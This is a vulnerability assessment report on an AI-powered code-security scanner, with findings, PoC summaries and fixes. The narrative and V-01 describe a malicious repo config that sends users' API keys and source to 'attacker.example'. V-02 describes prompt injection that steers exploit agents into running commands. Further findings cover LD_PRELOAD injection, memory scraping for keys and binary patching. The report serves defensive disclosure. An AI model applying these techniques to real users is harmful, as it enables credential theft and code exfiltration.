# FINAL VAPT REPORT — Black Duck Signal 2026.9.0

**Target application:** `signal-pyarmor-linux-x86_64` — Black Duck Signal 2026.9.0 ("AI-powered application security testing platform")
**Binary SHA-256:** `47b9fa7236a5be5ed37a9186d55a6a84b8d2ef65fd0ab9e2fa744b0641c7d915` (MD5 `3405623e…`, SHA-1 `c56602ea…`)
**Build:** PyInstaller 6.x onefile · CPython 3.13.5 · PyArmor 9.2.2 · built 2026-09-10 from `siglab/noscan`
**Assessment window:** 2026-10-15 · **Environments:** isolated Linux sandbox (egress-restricted) **and** analyst workstation (WSL2, internet-connected) — all findings reproduced independently on both
**Method:** static (CArchive extraction, SCA, prompt review, checksec) + dynamic (fake LLM endpoint capture, canary-driven exfiltration tests, memory/process introspection, patch/injection tests) + checklist-driven thick-client review (see `checklist-assessment-signal.md`)
**Overall risk: HIGH** (driven by V-01)

---

## Findings summary

| # | ID | Severity | Title | PoC |
|---|---|---|---|---|
| V-01 | SIG-01 | **HIGH** | Untrusted `.signal` config in scanned repo hijacks LLM endpoint → API-key theft + source-code exfiltration | SIG-01a/b/c ✅ |
| V-02 | SIG-02 | **MEDIUM-HIGH** | PoCKit agent pipeline executes instructions derived from untrusted repo content (prompt injection → command execution surface) | SIG-02 ✅ |
| V-03 | CHK-04 | **MEDIUM** | `LD_PRELOAD` code injection into the application process unmitigated | CHK-04 ✅ |
| V-04 | CHK-05 | **MEDIUM** | API key in cleartext process memory (incl. ready-to-send `Bearer` form) and in `/proc/<pid>/cmdline` | CHK-05 ✅ |
| V-05 | CHK-08 | **MEDIUM** | Plain `http://` accepted for credentialed LLM traffic (key + code unencrypted in transit) | CHK-08 ✅ |
| V-06 | SIG-03 | **MEDIUM** | Untrusted-cwd artifact ingestion: cache DB / checkpoint / imported results resolve inside the scanned repo (cache poisoning suspected) | SIG-03a/b ✅ |
| V-07 | SIG-04 | LOW | `--check-llm` reports "All LLM endpoints validated successfully" while every agent was SKIPPED | SIG-04 ✅ |
| V-08 | CHK-01 | LOW | Main executable not PIE — no ASLR for the primary image | CHK-01 ✅ |
| V-09 | CHK-02 | LOW | Partial RELRO — `.got.plt` remains writable | CHK-02 ✅ |
| V-10 | CHK-03 | LOW | Binary unsigned, no self-integrity check — trivially patchable | CHK-03 ✅ |
| V-11 | CHK-06 | LOW | Artifacts created world-readable under default umask (cache DB embeds scanned source code) | CHK-06 ✅ |
| V-12 | SIG-05 | INFO | Runtime egress dependencies: `llm.core.blackduck.com` (managed) and `openaipublic.blob.core.windows.net` (tiktoken, hash-pinned, hard-exit offline) | SIG-05a ✅ |
| V-13 | SIG-06 | INFO | LLM cache stores full prompts (= scanned source code) in plaintext SQLite | SIG-06 ✅ |
| V-14 | INFO-01 | INFO | Bundle ships proprietary assets unobfuscated: agent prompts, CWE exploit profiles, rule DBs, tests, build provenance | (static) ✅ |

**Confirmed secure behaviors (positive):** PyArmor 9.2.2 armor intact on all first-party code (no static recovery); no secrets anywhere in the 448 MB bundle; API keys redacted in logs; `--import-results` is plain JSON (no deserialization RCE — tested); `_MEI` self-extraction dir 0700 per-run; dependency base patched (langchain-core 1.4.9 ≥ 1.2.22 fixes for CVE-2025-68664/CVE-2026-34070; GitPython 3.1.59 = CVE-2025-48379 fix; langgraph ≥ 1.1.10 not affected by the < 1.0.10 checkpointer RCE chain); NX + stack canary + FORTIFY enabled; tiktoken CDN fetch is hash-pinned.

---

## V-01 (SIG-01) — HIGH — Repository-supplied `.signal` configuration hijacks the LLM endpoint: API-key theft and source-code exfiltration

| Field | Details |
|---|---|
| **Description** | Signal discovers its configuration file `.signal` (INI-style, per-agent sections) from the **current working directory**, which in the documented workflow is the root of the repository being scanned (`cd repo && signal .`). The file controls the LLM endpoint URI, model and key for **all seven agents** (`[LLM_SINGLEFILESCAN_AGENT]`, `[LLM_DATAFLOW_AGENT]`, `[LLM_OVERSIGHT_AGENT]`, `[LLM_EXPLOITATION_AGENT]`, `[LLM_SCA_AGENT]`, `[LLM_MERGEKEY_EMBED_AGENT]`, `[LLM_OVERSIGHT_EMBED_AGENT]`). A repository under analysis can therefore redirect every agent — and everything they transmit — to an attacker-controlled server. Configuration precedence: CLI > `.signal`; with no CLI `--llm-uri`, the repo file fully controls egress. |
| **Impact** | **Credential theft:** the victim's BYO LLM API key (OpenAI/Anthropic/Azure/GCP/Bedrock — direct monetary value and tenant access) is sent as `Authorization: Bearer <key>` to the attacker endpoint. **Source-code disclosure:** full file contents of the scanned repository are transmitted in request bodies together with the agent system prompts. No code execution on the victim host is required. For a product whose core use case is analyzing untrusted code, this is a direct breach of its own trust model. Indicative CVSS 3.1: 7.3 (`AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N`); higher in CI contexts. |
| **Affected URL / Components** | Config discovery + LLM factory (`agent_config_resolution`, `llm_uri_config`, `model_config` — PyArmor-obfuscated); all 7 agents; default managed endpoint `https://llm.core.blackduck.com`; any attacker-controlled `http(s)://…/v1` (OpenAI-compatible) supplied via `.signal` `uri =`. |
| **Proof of Concept** | PoC `SIG-01a/01b/01c` in `repro/run_all_pocs.py` — all **REPRODUCED** on two independent machines: **(a)** repo `.signal` with `uri = http://127.0.0.1:8899/v1`; run `signal . --llm-mode byo --llm-key sk-poc-… --check-llm true` from the repo → capture server logged `Authorization: Bearer sk-poc-…` on **5/5** requests (7/7 on the internet-connected workstation, i.e. every chat **and** embedding agent). **(b)** Full scan transmitted **10/18** request bodies containing the canary-tagged source file (`evidence_request.txt`: system prompt + file content in one request). **(c)** Control: run from a cwd outside the repo → **0** requests reach the attacker endpoint (cwd-scoped precondition). One-command run: `python3 repro/run_all_pocs.py --binary ./signal-pyarmor-linux-x86_64 --only SIG-01a,SIG-01b,SIG-01c`. |
| **Remediation Guidance** | 1) Never discover configuration from inside the scan target: compare `realpath(config)` against `realpath(TARGET)` and refuse/warn on overlap; default config discovery to a user-level path (`~/.config/signal/`). 2) Warn loudly when per-agent URIs differ from the managed default or previously seen values. 3) Block plain-`http://` LLM URIs (see V-05). 4) Support enterprise endpoint allowlists. 5) Document the trust model: everything inside TARGET — including configuration — is attacker-controlled. |

## V-02 (SIG-02) — MEDIUM-HIGH — PoCKit agent pipeline executes instructions derived from untrusted repository content

| Field | Details |
|---|---|
| **Description** | The bundled PoCKit 0.1.52 subsystem (enabled via experimental `--poc-kit` with `--dataflow` + `--synthesis`) runs a five-agent exploit-validation pipeline (Research → Environment Setup → Exploit → Validate → Fix Verification). Its own prompts instruct agents to: follow the scanned project's README/setup instructions (`find . -name "README*"`, "Setup scripts exist: Analyze and adapt scripts"), build Docker environments from them, remediate failures with `docker exec <container> pip install <missing-package>`, and write/execute PoC exploits (`run_exploit … executes a proof-of-concept inside Docker … execution_log.txt`). Every input to these agents (README, comments, source, SARIF annotations) is attacker-controllable in the product's core use case, and the prompts contain no instruction-hierarchy or anti-injection guardrails. |
| **Impact** | A malicious repository can steer host-side agent behavior: arbitrary command execution inside PoCKit containers (which have normal network access on a standard host), installation of attacker-chosen packages (supply-chain pivot), and influence over the exploit workspace written to `--poc-kit-report-dir` (default `./pockit-workspace`). Docker is the only containment boundary observed. Requires the experimental flag combination (reduces likelihood, not impact). |
| **Affected URL / Components** | `pockit/prompts/*.prompt` (plaintext in bundle: `environment_setup_prompt`, `super_agent_prompt`, `exploit_creator_prompt`, `research_prompt`, `validate_exploit_prompt`, `fix_verification_prompt`); `pockit/profiles/cwe_{22,79,89}_*/`; CLI flags `--poc-kit`, `--dataflow`, `--synthesis`, `--poc-kit-report-dir`, `--poc-kit-log-file`; local Docker daemon interface. |
| **Proof of Concept** | PoC `SIG-02` — **REPRODUCED (design-level)**: bundle extraction + prompt analysis confirms the command-execution instructions (`environment_setup_prompt.prompt: docker exec, pip install, README, "ALWAYS SETUP AND INSTALL PROJECT IN DOCKERIZED ENVIRONMENT", "Setup scripts exist"; super_agent_prompt.prompt: "executes a proof-of-concept"`). Full dynamic exploitation (injected README steering the environment-setup agent) requires Docker + a live LLM and was not executed in this engagement (sandbox lacked Docker; ethical scope). |
| **Remediation Guidance** | 1) Treat scanned content as data, never instructions: prepend instruction-hierarchy/anti-injection notices to every agent prompt. 2) Deny-by-default command allowlists for setup/exploit agents; never `pip install` packages suggested by repo content or error messages — resolve dependencies only from the project's own manifests. 3) Run PoCKit containers with `--network none` or an egress-proxied, logged network. 4) Human confirmation for host-level commands. 5) Pin base images. |

## V-03 (CHK-04) — MEDIUM — `LD_PRELOAD` code injection into the application process is unmitigated

| Field | Details |
|---|---|
| **Description** | The ELF binary is unsigned and contains no anti-tamper or loader hardening. A constructor-only shared object supplied via `LD_PRELOAD` executes arbitrary code inside the Signal process (bootloader and embedded Python runtime) before application logic runs. Demonstrated with a marker-writing constructor; the application continued to run normally. This is the Linux equivalent of Windows DLL preloading/hijacking. |
| **Impact** | Any local code-execution or environment-control primitive (including a malicious wrapper script, CI runner configuration, or compromised shell profile) yields full control of the application process: interception of the API key and scanned source at the trust boundary, tampering with results before they are written, or silent modification of behavior. No self-defense exists. |
| **Affected URL / Components** | Dynamic-linker load path of `signal-pyarmor-linux-x86_64` (PyInstaller bootloader + `pyarmor_runtime_008246/linux_x86_64/pyarmor_runtime.so`); no `RPATH`/`RUNPATH` present (no rpath hijack; `LD_PRELOAD` is the demonstrated vector). |
| **Proof of Concept** | PoC `CHK-04` — **REPRODUCED**: compiled a 5-line constructor `.so`, ran `LD_PRELOAD=./marker.so ./signal-pyarmor-linux-x86_64 --version`; marker file was created inside the app process; `--version` output unaffected (no integrity check blocked the injected library). |
| **Remediation Guidance** | 1) Sign releases (e.g., sigstore/cosign) and verify at install time; provide a documented verification command. 2) Consider startup self-integrity verification (own-hash check or signed manifest of extracted `_MEI` contents). 3) Document the standard Linux threat model: he who controls `LD_*`/the process environment owns the process — pair with OS-level controls (SELinux/AppArmor) in sensitive deployments. |

## V-04 (CHK-05) — MEDIUM — API key in cleartext process memory and process arguments

| Field | Details |
|---|---|
| **Description** | During execution the application holds the BYO API key in cleartext in multiple writable memory regions — including the fully-formed, ready-to-send `Authorization: Bearer <key>` header string — and the key is passed on the command line, exposing it via `/proc/<pid>/cmdline` to every same-user process for the process lifetime. Found in both the bootloader parent (stack, from argv) and the ~210 MB application child (heap/anon regions). |
| **Impact** | Local information disclosure: any same-user malware, co-tenant process, or crash-dump/swap collection can recover a live LLM API key. Combined with V-03 (no integrity protection), memory scraping is trivial for injected code. |
| **Affected URL / Components** | Application child process (PyInstaller onefile runtime); OpenAI-compatible HTTP client (`utils.llm`); `/proc/<pid>/mem`, `/proc/<pid>/cmdline`. |
| **Proof of Concept** | PoC `CHK-05` — **REPRODUCED**: stalled the app (endpoint pointing at a non-routable IP), scanned parent + child writable memory regions as process ancestor; the canary key was found in both PIDs, including the `Bearer <key>` form. |
| **Remediation Guidance** | 1) Accept keys via environment variable or 0600 config file rather than CLI flags (argv is world-readable to same-user processes). 2) Zeroize key buffers after client construction where feasible; avoid retaining the pre-rendered header string. 3) Document crash-dump/core-dump handling for sensitive environments. |

## V-05 (CHK-08) — MEDIUM — Plain `http://` accepted for credentialed LLM traffic

| Field | Details |
|---|---|
| **Description** | BYO LLM endpoint URIs (`--llm-uri` or `.signal` `uri =`) are accepted with the `http://` scheme without warning or refusal. All agent traffic — `Authorization: Bearer <key>` headers, system prompts, and complete scanned source files — is then transmitted unencrypted. |
| **Impact** | Network-adjacent attackers (corporate LAN, exit nodes, MITM positions) can harvest API keys and full source code from the wire. The capture-based PoC proves the application performs no scheme validation and does not enforce TLS. |
| **Affected URL / Components** | `--llm-uri` CLI option; `.signal` per-agent `uri` values; HTTP clients for all 7 agents; any `http://…/v1` endpoint. |
| **Proof of Concept** | PoC `CHK-08` — **REPRODUCED**: the SIG-01 capture endpoint is plain HTTP; **23** captured requests carried the `Bearer` canary key over unencrypted HTTP (5 in check-llm, 18 in the full scan), with source-code bodies. |
| **Remediation Guidance** | Refuse `http://` LLM URIs by default (opt-in escape hatch with explicit warning for localhost/testing); enforce TLS ≥ 1.2; consider certificate pinning for the managed endpoint. |

## V-06 (SIG-03) — MEDIUM — Untrusted-cwd artifact ingestion: cache DB, checkpoints and imported results resolve inside the scanned repository

| Field | Details |
|---|---|
| **Description** | Besides `.signal`, several security-relevant inputs default to cwd-relative paths — which equals inside the scanned repo in the default workflow: `--cache-file` (default `signal-cache.db`), `--checkpoint-file` (resume dataflow scans), `--import-results` (ingest prior results, "skip re-analysis"). The cache schema (`full_llm_cache(prompt, llm, idx, response)`, `full_md5_llm_cache(...)`) keys responses by full prompt; prompt formats are deterministic and observable by any attacker (e.g., via V-01 or by scanning their own repo once). A repo-shipped cache/checkpoint/results file is therefore ingested as trusted prior analysis. |
| **Impact** | **Result suppression / poisoning (suspected):** a malicious repository can pre-seed cache entries so deliberately vulnerable code receives "clean" verdicts (false negatives) — the inverse goal of a security scanner — or inject crafted findings (false positives, report manipulation). Not demonstrated end-to-end (cached rows were not produced with the canned-LLM test rig), but the ingestion path, default location, and deterministic keying are confirmed. The import path itself is plain JSON — **no deserialization RCE** (tested with `py/object`/`py/reduce` payloads). |
| **Affected URL / Components** | `--cache-file` / `--cache-database` (SQLite/PostgreSQL LLM cache), `--checkpoint-file`, `--import-results` / `--export-results`; default filenames in cwd: `signal-cache.db`, `results.sarif`, `signal_errors.json`. |
| **Proof of Concept** | PoC `SIG-03a/03b` — **CONFIRMED**: (a) crafted jsonpickle-style `--import-results` payloads executed nothing (positive control); (b) cache schema dumped showing plaintext prompt-keyed cache; defaults documented. Cache-poisoning end-to-end marked **suspected** — vendor verification required. |
| **Remediation Guidance** | 1) Same root fix as V-01: never read or write security-relevant state inside TARGET (realpath guard). 2) Default cache/checkpoint/results to a per-user or target-hash-scoped directory. 3) Bind cache entries to prompt+model+target-hash and re-verify high-severity findings on report. 4) Treat imported results as untrusted data. |

## V-07 (SIG-04) — LOW — `--check-llm` reports success while validating nothing

| Field | Details |
|---|---|
| **Description** | In managed mode without a token, `--check-llm` (whose stated purpose is "Validate LLM endpoint connectivity and model availability, then exit… verify BYO LLM configuration before running a scan") shows every agent as `⚠ SKIPPED (not configured)` and still concludes **"All LLM endpoints validated successfully."** with exit code 0. |
| **Impact** | CI/CD gates keyed on `--check-llm` pass while no endpoint was contacted, converting misconfiguration into silently skipped analysis (false negatives downstream). BYO mode, by contrast, fails closed on incomplete configuration. |
| **Affected URL / Components** | `--check-llm` / `--check-llm-json` (schema_version 1) in managed mode; `utils.llm` connectivity checks against `https://llm.core.blackduck.com`. |
| **Proof of Concept** | PoC `SIG-04` — **REPRODUCED**: `signal <target> --check-llm true` (managed, no token) prints per-agent `SKIPPED (not configured)` followed by the success summary, exit 0. |
| **Remediation Guidance** | Exit non-zero or print an explicit FAILURE summary when any agent was skipped; make the summary line and the `--check-llm-json` top-level `status` distinguish "validated" from "skipped". |

## V-08 (CHK-01) — LOW — Main executable is not PIE (no ASLR for the primary image)

| Field | Details |
|---|---|
| **Description** | The ELF header type is `EXEC` with a fixed load base of `0x400000`; the bootloader (and its C code, which includes unsafe imports such as `strcpy`) is therefore always at identical addresses. Shared libraries are ASLR'd normally. |
| **Impact** | Marginally simplifies exploitation of any bootloader memory-corruption bug (fixed code/PLT addresses; no ASLR for the primary image). No memory-corruption vulnerability was identified in this assessment, so impact is defense-in-depth only. |
| **Affected URL / Components** | `signal-pyarmor-linux-x86_64` ELF header/build flags (PyInstaller bootloader build). |
| **Proof of Concept** | PoC `CHK-01` — **REPRODUCED**: pure-Python checksec — `e_type = EXEC` (fixed base 0x400000). Full result: NX=ON, canary=ON, FORTIFY=ON, RPATH=OFF. |
| **Remediation Guidance** | Build the bootloader with `-fPIE -pie` (standard in modern PyInstaller build chains; verify spec/build flags). |

## V-09 (CHK-02) — LOW — Partial RELRO (`.got.plt` writable)

| Field | Details |
|---|---|
| **Description** | A `PT_GNU_RELRO` segment exists but no `DT_BIND_NOW`/`DF_BIND_NOW` — lazy binding leaves `.got.plt` writable, allowing GOT-overwrite attacks following any memory-write primitive. `pyarmor_runtime.so` has the same profile. |
| **Impact** | Defense-in-depth gap only (requires a prior memory-corruption primitive, none identified). |
| **Affected URL / Components** | Dynamic section / program headers of `signal-pyarmor-linux-x86_64` and `pyarmor_runtime_008246/linux_x86_64/pyarmor_runtime.so`. |
| **Proof of Concept** | PoC `CHK-02` — **REPRODUCED**: RELRO segment present, `BIND_NOW` absent → partial RELRO. |
| **Remediation Guidance** | Link with `-Wl,-z,relro,-z,now` (full RELRO). |

## V-10 (CHK-03) — LOW — Binary unsigned, no self-integrity check (trivially patchable)

| Field | Details |
|---|---|
| **Description** | The ELF carries no code signature and performs no self-verification: a copy of the binary with a modified byte in a runtime-mapped page executes normally. The GitHub release asset is likewise unsigned — consumers cannot verify provenance (this assessment could only verify integrity against a user-supplied hash). |
| **Impact** | Tampered or trojanized copies of the security tool are indistinguishable from genuine ones — a high-value target given the tool processes source code and credentials. Combined with V-03, local tampering is silent. |
| **Affected URL / Components** | Distribution channel (GitHub release `v1.0` asset `signal-pyarmor-linux-x86_64`); bootloader `.rodata` (patch site `0xc1b8` in the PoC). |
| **Proof of Concept** | PoC `CHK-03` — **REPRODUCED**: patched one byte at offset `0xc1b8` (mapped R-E segment) in a copy; `--version`/`--help` ran normally. |
| **Remediation Guidance** | Sign every release artifact and publish checksums/signatures out-of-band; consider a startup self-hash check; document a verification procedure for consumers. |

## V-11 (CHK-06) — LOW — Artifacts created world-readable under default umask

| Field | Details |
|---|---|
| **Description** | `results.sarif`, the LLM cache DB (`signal-cache.db` / `--cache-file`), logs and `signal_errors.json` are created 0644 under a default umask. The cache DB embeds full prompts, i.e. **copies of the scanned source code** (see V-13). |
| **Impact** | Local information disclosure of scanned proprietary code and analysis results to other users on multi-user hosts/CI runners. |
| **Affected URL / Components** | Output writers for `--report-file` (default `results.sarif`), `--cache-file`, `--log-file`, `--error-log-file`, `signal_errors.json` (auto-created in cwd). |
| **Proof of Concept** | PoC `CHK-06` — **REPRODUCED**: `results.sarif=0o644`, `poc-cache.db=0o644` after a scan. |
| **Remediation Guidance** | Create all artifacts with 0600 (or 0640 with a documented group) regardless of umask. |

## V-12 (SIG-05) — INFO — Runtime egress dependencies and their trust anchors

| Field | Details |
|---|---|
| **Description** | Two external endpoints are contacted at runtime: managed-mode LLM traffic to `https://llm.core.blackduck.com` (all analyzed code is sent there in managed mode — expected product behavior that belongs in data-handling documentation), and a one-time fetch of `https://openaipublic.blob.core.windows.net/encodings/cl100k_base.tiktoken` (tiktoken) at first embedding use. The fetch is **hash-pinned** (a cache file with wrong content is detected and deleted — verified), but without egress the scan **hard-exits** (`SIGNAL-E63`). |
| **Impact** | Availability dependency on a third-party CDN (air-gapped deployments fail unless `TIKTOKEN_CACHE_DIR` is pre-seeded); privacy consideration for managed-mode users (code leaves the machine to Black Duck's cloud). |
| **Affected URL / Components** | `https://llm.core.blackduck.com` (managed mode); `https://openaipublic.blob.core.windows.net/encodings/cl100k_base.tiktoken` (embedding agents); `TIKTOKEN_CACHE_DIR` (pre-seed path, sha1-named cache key `9b5ad71b…`, canonical file sha256 `223921b7…`). |
| **Proof of Concept** | PoC `SIG-05a` — **REPRODUCED**: with a fresh `TIKTOKEN_CACHE_DIR`, the app fetched (or attempted, in the egress-restricted sandbox) `cl100k_base.tiktoken` and hard-exited on block; seeding the canonical file unblocks the scan. |
| **Remediation Guidance** | Bundle or offer an offline encoding package; degrade gracefully (warn + continue without embeddings) instead of hard exit; document all egress endpoints for enterprise firewalls. |

## V-13 (SIG-06) — INFO — LLM cache stores full prompts (scanned source code) in plaintext SQLite

| Field | Details |
|---|---|
| **Description** | The LLM query cache persists complete prompts — system prompt plus scanned file content — in cleartext: tables `full_llm_cache(prompt, llm, idx, response)` and `full_md5_llm_cache(id, prompt_md5, llm, idx, prompt, response)`. |
| **Impact** | At-rest copies of scanned proprietary source on user machines/CI runners (compounded by V-11 permissions); cache files must be treated as sensitive artifacts. |
| **Affected URL / Components** | `--cache-file` (SQLite) / `--cache-database` (PostgreSQL DSN with embedded credentials); cache layer of `utils.llm`. |
| **Proof of Concept** | PoC `SIG-06` — **CONFIRMED**: schema dumped from the cache DB produced during the PoC scan. |
| **Remediation Guidance** | Document cache sensitivity; offer encrypted cache at rest; ensure DSN credentials in `--cache-database` are not logged (verified they are redacted in argv logging). |

## V-14 (INFO-01) — INFO — Proprietary assets shipped unobfuscated in the bundle

| Field | Details |
|---|---|
| **Description** | While all first-party code is PyArmor-obfuscated, the PyInstaller layer ships in plaintext: the complete PoCKit agent prompt suite, CWE-22/79/89 exploit-guidance profiles and validation checklists, 1,258 SAST rule names (`data/default_rules.csv`) with DAST/SAST coverage and "PQC" novelty classifications, the entire (obfuscated) test suite revealing internal behaviors, and wheel metadata with build provenance (`/builds/siglab/noscan`, author email, exact build timestamps). |
| **Impact** | Intellectual-property exposure and free reconnaissance for attackers: rule sets can be enumerated and evaded; prompts can be studied to craft inputs that steer agents (feeds V-02); build layout aids targeted attacks. |
| **Affected URL / Components** | `pockit/prompts/`, `pockit/profiles/`, `data/*.csv`, `tests/`, `signal-2026.9.0.dist-info/*`. |
| **Proof of Concept** | Static extraction (companion report `signal-binary-analysis.md` §6): all assets recovered verbatim via `pyinstxtractor-ng`. |
| **Remediation Guidance** | Strip tests and dist-info from release builds; move prompts/profiles/rules behind the PyArmor layer or into encrypted resources if considered proprietary. |

---

## Demonstrated attack narrative (V-01 + V-05)

1. Attacker publishes a repository containing a `.signal` file (7 agent sections, `uri = http://attacker.example/v1`) plus any code.
2. Victim (analyst or CI job): `git clone … && cd repo && signal . --llm-mode byo --llm-key $KEY`.
3. Observed in both test environments: every agent validates against and transmits to the attacker endpoint — `Authorization: Bearer <victim key>` captured; complete file contents of the scanned repo captured (10/18 requests carried the canary-tagged source); traffic unencrypted (V-05).
4. Attacker gains a live LLM API key and a copy of the victim's codebase. No victim-side code execution required.

## Running every PoC locally

**Prerequisites:** Linux x86_64 (WSL2/Docker on Windows — see `manual-verification/REPRODUCTION-GUIDE.md` §0.1), Python 3.8+; optional: `gcc` (for CHK-04), `python3-venv` (for SIG-02), internet (for SIG-01b/SIG-05a's tiktoken fetch; otherwise pass `--tiktoken-file cl100k_base.tiktoken`).

```bash
# everything (≈2–4 min):
python3 repro/run_all_pocs.py --binary ./signal-pyarmor-linux-x86_64

# offline machines:
python3 repro/run_all_pocs.py --binary ./signal-pyarmor-linux-x86_64 \
    --tiktoken-file /path/to/cl100k_base.tiktoken

# a single vulnerability's PoC, e.g. V-01:
python3 repro/run_all_pocs.py --binary ./signal-pyarmor-linux-x86_64 --only SIG-01a,SIG-01b,SIG-01c

# list all PoC ids:
python3 repro/run_all_pocs.py --list
```

Verdicts are printed and saved to `poc-evidence/SUMMARY.md`; raw evidence lands alongside (captured requests, patched-binary output, memory-scan results, prompt extraction). Every PoC above was executed and verified against the target on two independent machines (egress-restricted sandbox and internet-connected WSL2 workstation).

| Vulnerability | PoC id(s) in `run_all_pocs.py` |
|---|---|
| V-01 | `SIG-01a`, `SIG-01b`, `SIG-01c` |
| V-02 | `SIG-02` |
| V-03 | `CHK-04` |
| V-04 | `CHK-05` |
| V-05 | `CHK-08` |
| V-06 | `SIG-03a`, `SIG-03b` |
| V-07 | `SIG-04` |
| V-08 / V-09 | `CHK-01`, `CHK-02` |
| V-10 | `CHK-03` |
| V-11 | `CHK-06` |
| V-12 | `SIG-05a` |
| V-13 | `SIG-06` |
| V-14 | static extraction (companion report) |

## Appendix — SCA summary (bundled versions)

Patched/current: langchain-core **1.4.9** (fixes CVE-2025-68664 "LangGrinch" ≤1.2.4 and CVE-2026-34070 ≤1.2.21), langchain 1.3.14, langgraph ≥1.1.10 (CVE-2025-67644/CVE-2026-28277 chain affects <1.0.10), GitPython 3.1.59 (CVE-2025-48379 fix), aiohttp 3.14.1, cryptography 48.0.1, numpy 2.3.5, pydantic 2.13.3, httpx 0.28.1, urllib3 2.7.0, openai 2.38.0, tiktoken 0.12.0. Note: namespaced duplicate httpx/httpcore (0.28.1 + 2.3.0) doubles the patch surface. No open CVEs identified in bundled versions at assessment time.

**Supporting documents:** `signal-binary-analysis.md` (packaging/obfuscation/inventory) · `vapt-report-signal-2026.9.0.md` (primary engagement report) · `checklist-assessment-signal.md` (thick-client checklist) · `repro/` (PoC scripts, guide, archived evidence).
